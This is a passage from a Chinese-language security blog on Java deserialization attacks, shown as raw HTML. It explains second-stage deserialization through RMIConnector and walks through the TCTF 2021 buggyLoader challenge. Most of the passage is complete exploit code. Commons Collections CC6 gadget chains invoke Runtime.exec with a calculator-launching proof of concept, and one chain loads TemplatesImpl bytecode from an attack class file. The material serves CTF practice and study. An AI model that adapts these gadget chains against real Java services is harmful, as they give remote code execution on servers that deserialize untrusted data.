class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(lazyMap,chainedTransformer);<br>      <br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> serialize2Base64(map2);<br>        run(s);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize2Base64</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String base64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>        rmiConnector.connect();<br><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>那么接下来的问题就是如何把这个<code>connect()</code>​方法给利用起来，第一种方法比较难跟，但是第二种方法我们就可以联想到最简单的CC链的<code>InvokerTransformer</code>​来进行任意类任意方法调用，这样子就可以套一层反射来调用<code>connect()</code>​了</p><p>‍</p><p>于是就可以写出EXP，通过CC6来进行调用二次反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> RMIconnector;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_t</span> &#123;<br><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(lazyMap,chainedTransformer);<br><br><br><br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> serialize2Base64(map2);<br>        run(s);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser));<br>        objectInputStream.readObject();<br>        System.out.println(<span class="hljs-string">&quot;Unserialize Ok!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize2Base64</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;Serialize Ok!&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(s);<br>        System.out.println(s.length());<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String base64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">connect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,rmiConnector);<br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap1.put(tiedMapEntry, <span class="hljs-string">&quot;2&quot;</span>);<br>        lazyMap.remove(rmiConnector);<br>        setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,connect);<br>        <span class="hljs-type">byte</span>[] serialize = serialize(hashMap1);<br>        unserialize(serialize);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125971.png" alt="image">​</p><p>调用栈</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">findRMIServerJRMP:1993,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">findRMIServer:1924,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">connect:287,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">connect:249,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">invoke0:-1,</span> <span class="hljs-string">NativeMethodAccessorImpl</span> <span class="hljs-string">(sun.reflect)</span><br><span class="hljs-string">invoke:62,</span> <span class="hljs-string">NativeMethodAccessorImpl</span> <span class="hljs-string">(sun.reflect)</span><br><span class="hljs-string">invoke:43,</span> <span class="hljs-string">DelegatingMethodAccessorImpl</span> <span class="hljs-string">(sun.reflect)</span><br><span class="hljs-string">invoke:498,</span> <span class="hljs-string">Method</span> <span class="hljs-string">(java.lang.reflect)</span><br><span class="hljs-string">transform:125,</span> <span class="hljs-string">InvokerTransformer</span> <span class="hljs-string">(org.apache.commons.collections.functors)</span><br><span class="hljs-string">get:151,</span> <span class="hljs-string">LazyMap</span> <span class="hljs-string">(org.apache.commons.collections.map)</span><br><span class="hljs-string">getValue:73,</span> <span class="hljs-string">TiedMapEntry</span> <span class="hljs-string">(org.apache.commons.collections.keyvalue)</span><br><span class="hljs-string">hashCode:120,</span> <span class="hljs-string">TiedMapEntry</span> <span class="hljs-string">(org.apache.commons.collections.keyvalue)</span><br><span class="hljs-string">hash:339,</span> <span class="hljs-string">HashMap</span> <span class="hljs-string">(java.util)</span><br><span class="hljs-string">readObject:1413,</span> <span class="hljs-string">HashMap</span> <span class="hljs-string">(java.util)</span><br></code></pre></td></tr></table></figure><p>‍</p><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><p>‍</p><h2 id="TCTF-2021-buggyLoader"><a href="#TCTF-2021-buggyLoader" class="headerlink" title="[TCTF 2021]buggyLoader"></a>[TCTF 2021]buggyLoader</h2><p><a href="https://github.com/waderwu/javaDeserializeLabs">https://github.com/waderwu/javaDeserializeLabs</a></p><p>‍</p><h3 id="考点分析-1"><a href="#考点分析-1" class="headerlink" title="考点分析"></a>考点分析</h3><p>‍</p><ol><li>Java代码审计</li><li>Java RMIConnector 二次反序列化</li></ol><p>‍</p><p>对传进来的data参数进行了hex的处理，处理过后用自定义的<code>MyObjectInputStream</code>​来处理字节，然后满足属性直接反序列化</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125491.png" alt="image">​</p><p>先来看看​<code>hexStringToBytes</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125644.png" alt="image">​</p><p>就是个hex解码而已</p><p>‍</p><p>然后看自定义的<code>MyObjectInputStream</code>​ </p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125803.png" alt="image">​</p><p>可以看到重写了resolveClass方法，使用了<code>URLClassLoader.loadClass()</code>​而非默认的<code>Class.forName()</code>​去加载类</p><h3 id="关于ResolveClass"><a href="#关于ResolveClass" class="headerlink" title="关于ResolveClass"></a>关于ResolveClass</h3><p>在Java中，当使用<code>ObjectInputStream</code>​进行反序列化时，<code>resolveClass()</code>​方法会默认被调用，其作用就是对类进行验证和加载，具体来说，当反序列化一个对象时，如果该对象包含的类尚未被加载，那么<code>ObjectInputStream</code>​就会调用<code>resolveClass()</code>​方法来加载该类。resolveClass()方法的默认实现会使用当前线程的上下文<code>ClassLoader</code>​来加载类,即<code>Class.forName()</code>​</p><p>另外，<code>resolveClass()</code>​方法还可以用于防止恶意攻击，比如通过序列化和反序列化来注入恶意代码或者执行非法操作。通过在​<code>resolveClass()</code>​方法中实现自定义的安全检查逻辑，做一些过滤处理，例如过滤一些危险类JNDI、RMI、TemplatesImpl等，可以有效地增强反序列化的安全性。</p><p>‍</p><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>查看下依赖，可以发现存在CC的依赖，那么直接打CC就好了</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125964.png" alt="image">​</p><p>‍</p><h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>但是<code>URLClassLoader.loadClass()</code>​跟默认的<code>Class.forName()</code>​有啥区别呢？</p><p>区别在于<code>URLClassLoader.loadClass()</code>​不能够加载数组，举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        System.out.println(Class.forName(<span class="hljs-string">&quot;[[B&quot;</span>));  <span class="hljs-comment">// class [[B</span><br>        System.out.println(URLClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;[[B&quot;</span>));  <span class="hljs-comment">// ClassNotFoundException</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125117.png" alt="image">​</p><p>那么既然是因为这个，所以我们的数组的payload就无法使用了，因为在打CC的过程当中基本都会带上<code>ChainedTransformer</code>​来链式调用，或者在最后的Sink的点的时候会用到<code>TemplatesImpl</code>​来加载<code>byte[][]</code>​字节码，但是这里就都没办法使用了，当然了不使用<code>ChainedTransformer</code>​链式调用一个一个手动来触发也是可以的，但是因为存在<code>RMIConnector</code>​进行二次反序列化会更加方便，因为我们可以只需要单<code>InvokerTransformer</code>​来进行反射调用<code>connect()</code>​方法即可，那么写出EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">buggyLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc6的HashMap链</span><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span 